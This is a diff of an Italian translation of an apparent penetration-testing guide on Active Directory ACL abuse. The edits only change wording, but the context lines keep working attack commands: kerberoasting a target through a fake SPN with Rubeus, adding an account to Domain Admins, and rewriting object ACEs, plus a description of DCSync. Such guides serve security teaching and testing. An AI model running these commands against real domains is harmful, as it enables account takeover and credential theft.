@@ -16,7 +16,7 @@ BadSuccessor.md
 Questo privilegio concede a un attaccante il pieno controllo su un account utente target. Una volta confermati i diritti `GenericAll` utilizzando il comando `Get-ObjectAcl`, un attaccante può:
 
 - **Cambiare la Password del Target**: Utilizzando `net user <username> <password> /domain`, l'attaccante può reimpostare la password dell'utente.
-- **Kerberoasting Mirato**: Assegnare un SPN all'account dell'utente per renderlo kerberoastable, quindi utilizzare Rubeus e targetedKerberoast.py per estrarre e tentare di decifrare gli hash del ticket di concessione del ticket (TGT).
+- **Kerberoasting Mirato**: Assegnare un SPN all'account dell'utente per renderlo kerberoastabile, quindi utilizzare Rubeus e targetedKerberoast.py per estrarre e tentare di decifrare gli hash del ticket di concessione del ticket (TGT).
 ```bash
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
@@ -59,7 +59,7 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 ```
 ## **WriteProperty (Auto-Membership)**
 
-Un privilegio simile, questo consente agli attaccanti di aggiungersi direttamente ai gruppi modificando le proprietà del gruppo se hanno il diritto di `WriteProperty` su quei gruppi. La conferma e l'esecuzione di questo privilegio vengono eseguite con:
+Un privilegio simile, questo consente agli attaccanti di aggiungersi direttamente ai gruppi modificando le proprietà del gruppo se hanno il diritto `WriteProperty` su quei gruppi. La conferma e l'esecuzione di questo privilegio vengono eseguite con:
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
@@ -111,9 +111,9 @@ $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityRe
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
-## **Replica sul Dominio (DCSync)**
+## **Replica nel Dominio (DCSync)**
 
-L'attacco DCSync sfrutta specifiche autorizzazioni di replica sul dominio per imitare un Domain Controller e sincronizzare i dati, comprese le credenziali degli utenti. Questa potente tecnica richiede autorizzazioni come `DS-Replication-Get-Changes`, consentendo agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Scopri di più sull'attacco DCSync qui.**](../dcsync.md)
+L'attacco DCSync sfrutta specifiche autorizzazioni di replica nel dominio per mimare un Domain Controller e sincronizzare i dati, comprese le credenziali degli utenti. Questa potente tecnica richiede autorizzazioni come `DS-Replication-Get-Changes`, consentendo agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller. [**Scopri di più sull'attacco DCSync qui.**](../dcsync.md)
 
 ## Delegazione GPO <a href="#gpo-delegation" id="gpo-delegation"></a>
 
